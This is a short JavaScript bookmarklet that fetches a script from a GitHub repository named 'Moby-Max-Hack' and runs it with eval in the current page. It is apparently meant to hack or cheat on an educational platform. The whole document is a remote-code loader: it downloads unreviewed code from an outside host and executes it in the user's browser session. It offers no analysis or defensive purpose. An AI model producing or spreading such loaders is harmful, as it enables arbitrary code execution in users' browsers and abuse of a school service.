javascript:req = new XMLHttpRequest();
req.open('GET', 'https://raw.githubusercontent.com/VirescentOverlord/Moby-Max-Hack/main/Main%20Script');
req.onload = function() {
  eval(this.responseText + 'm.appendChild(r)');
};
req.send();
